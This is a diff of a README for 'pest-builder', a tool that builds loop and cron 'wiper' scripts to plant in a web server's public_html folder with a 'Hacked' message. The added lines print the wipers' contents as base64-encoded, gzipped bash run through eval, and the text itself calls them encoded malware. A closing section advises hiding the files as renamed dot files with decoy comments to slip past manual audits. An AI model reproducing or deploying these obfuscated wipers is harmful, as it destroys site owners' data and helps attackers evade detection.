@@ -30,22 +30,34 @@ Make it executable by running
 chmod +x pest-builder
 ```
 
-To build a loop wiper, run:
+To build a **loop wiper**, run:
 
 ```bash
-./pest-builder loop /home/user/public_html "Hacked" 60
+./pest-builder loop "/home/user/public_html" "Hacked" 120
 ```
 
-A file named ".loop_wiper" will be created.
-
-
-To build a cron wiper, run:
+A file named **".loop_wiper"** will be created. It's contents will look like this
 
 ```bash
-./pest-builder cron /home/user/public_html "Hacked" 60
+#!/usr/bin/env bash
+eval "$(echo -n 'H4sIAAAAAAAAA5VRXUvDMBR9v7/iLoSxCbPW11JhYlDB2rEO9jBGqckdLaZp7QcK4n832NWtQh/MQ0g45x7OORcUSZ1UhIsKt+J2HYYbnzlpkZPT1lQ5ZfuiMxmnTa6ZB3DGXi+fozCIAxFFy3vhs4dEvpL6Q4qehFjFm8dA+O71lcXg0BrZZIVBqdVsjp+A9uxwggtCxl2Ge5xOsaKmrYx3AtUoOJjbDZmy+/RUxlfbO4YTf1SM8ZmukbvzHs3xwuY4jOLdNMLXWbJENr/JbErkx2I7EZJpgXzYHt6wnuRkRtHHZZmW7D/844KsDYD3NNNkzbq2mzd77z1UBfyIWWte96o1UYn8tCAPVGEIvgGdBZGrEQIAAA==' | base64 -d | gunzip -c)";
 ```
 
-A file named ".cron_wiper" will be created.
+
+To build a **cron wiper**, run:
+
+```bash
+./pest-builder cron "/home/user/public_html" "Hacked" 120
+```
+
+A file named **".cron_wiper"** will be created. It's contents will look like something similar to this  
+
+```bash
+#!/usr/bin/env bash
+eval "$(echo -n 'H4sIAAAAAAAAA5WRXUvDMBSG7/Mr3h3C2IRZ6+2oMDGoYO1YB7sYUmqS0WL6QdaCIP53A13nKvTC3IXnOSfnPWFKS5NajYXFTtxvomgbkJdVhfbao7Ze3b6bXCZZUxhaMnZhb1avcRQmoYjj1aMI6CmVH1r9keIXIdbJ9jkUgX974xg7tKVs8qqENGo2xxeDO3tMsNAg7hPeMJ3C6qa15fIXqlE4qNsPTdldepX4evdAmASjzYjPzBHcn/e0wJXLcRjlXTXY90WyVDbnZC4l+GmxXRMtswp8uD3cUS95ean053Wd1fQf//RBbgzmnmc/RcAVN9cBAAA=' | base64 -d | gunzip -c)";
+```
+
+Yes. It's an encoded malware.
 
 ## Obfuscation
 It is important you obfuscate these files by changing the file names, making them dot files and adding useless comments at the top of the file to distract during manual audit.
